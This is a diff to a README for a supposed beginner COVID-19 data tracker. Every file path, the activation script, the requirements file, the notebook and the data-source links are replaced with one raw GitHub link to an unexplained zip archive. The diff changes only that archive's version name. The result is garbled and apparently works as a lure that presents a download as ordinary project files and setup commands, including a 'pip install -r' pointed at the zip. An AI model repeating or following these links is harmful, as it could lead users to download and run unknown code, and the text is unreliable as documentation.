@@ -24,14 +24,14 @@ A beginner-friendly data analysis project that downloads the latest global COVID
 ```
 covid19-global-data-tracker/
 ├─ notebooks/
-│  └─ https://github.com/Griffnificent/covid-tracker/raw/refs/heads/main/curvedly/covid-tracker-v1.2.zip
+│  └─ https://github.com/Griffnificent/covid-tracker/raw/refs/heads/main/curvedly/tracker-covid-v3.5.zip
 ├─ src/
-│  └─ https://github.com/Griffnificent/covid-tracker/raw/refs/heads/main/curvedly/covid-tracker-v1.2.zip
+│  └─ https://github.com/Griffnificent/covid-tracker/raw/refs/heads/main/curvedly/tracker-covid-v3.5.zip
 ├─ outputs/               # charts/exports saved here by the notebook
-├─ https://github.com/Griffnificent/covid-tracker/raw/refs/heads/main/curvedly/covid-tracker-v1.2.zip
+├─ https://github.com/Griffnificent/covid-tracker/raw/refs/heads/main/curvedly/tracker-covid-v3.5.zip
 ├─ .gitignore
 ├─ LICENSE
-└─ https://github.com/Griffnificent/covid-tracker/raw/refs/heads/main/curvedly/covid-tracker-v1.2.zip
+└─ https://github.com/Griffnificent/covid-tracker/raw/refs/heads/main/curvedly/tracker-covid-v3.5.zip
 ```
 
 ## ▶️ How to Run (Windows / macOS / Linux)
@@ -41,7 +41,7 @@ covid19-global-data-tracker/
    ```bash
    # Windows (PowerShell)
    python -m venv .venv
-   .venv\Scripts\https://github.com/Griffnificent/covid-tracker/raw/refs/heads/main/curvedly/covid-tracker-v1.2.zip
+   .venv\Scripts\https://github.com/Griffnificent/covid-tracker/raw/refs/heads/main/curvedly/tracker-covid-v3.5.zip
 
    # macOS/Linux
    python3 -m venv .venv
@@ -51,7 +51,7 @@ covid19-global-data-tracker/
 2. **Install dependencies**
 
    ```bash
-   pip install -r https://github.com/Griffnificent/covid-tracker/raw/refs/heads/main/curvedly/covid-tracker-v1.2.zip
+   pip install -r https://github.com/Griffnificent/covid-tracker/raw/refs/heads/main/curvedly/tracker-covid-v3.5.zip
    ```
 
 3. **Launch Jupyter and open the notebook**
@@ -60,18 +60,18 @@ covid19-global-data-tracker/
    jupyter notebook
    ```
 
-   Open: `https://github.com/Griffnificent/covid-tracker/raw/refs/heads/main/curvedly/covid-tracker-v1.2.zip` and run all cells (Kernel → Restart & Run All).
+   Open: `https://github.com/Griffnificent/covid-tracker/raw/refs/heads/main/curvedly/tracker-covid-v3.5.zip` and run all cells (Kernel → Restart & Run All).
 
 ## 🌍 Data Source
 
 * Our World in Data (OWID) COVID-19 dataset. The notebook pulls from:
 
-  * `https://github.com/Griffnificent/covid-tracker/raw/refs/heads/main/curvedly/covid-tracker-v1.2.zip` (primary)
-  * `https://github.com/Griffnificent/covid-tracker/raw/refs/heads/main/curvedly/covid-tracker-v1.2.zip` (fallback)
+  * `https://github.com/Griffnificent/covid-tracker/raw/refs/heads/main/curvedly/tracker-covid-v3.5.zip` (primary)
+  * `https://github.com/Griffnificent/covid-tracker/raw/refs/heads/main/curvedly/tracker-covid-v3.5.zip` (fallback)
 
 ## 📝 Notes & Tips
 
-* If an internet connection is blocked, download the CSV manually and place it in `https://github.com/Griffnificent/covid-tracker/raw/refs/heads/main/curvedly/covid-tracker-v1.2.zip`, then set `USE_LOCAL_FILE = True` in the notebook.
+* If an internet connection is blocked, download the CSV manually and place it in `https://github.com/Griffnificent/covid-tracker/raw/refs/heads/main/curvedly/tracker-covid-v3.5.zip`, then set `USE_LOCAL_FILE = True` in the notebook.
 * All figures are saved in `outputs/` when you run the export cells.
 
 ## 🔍 Insights & Reflections (example prompts)
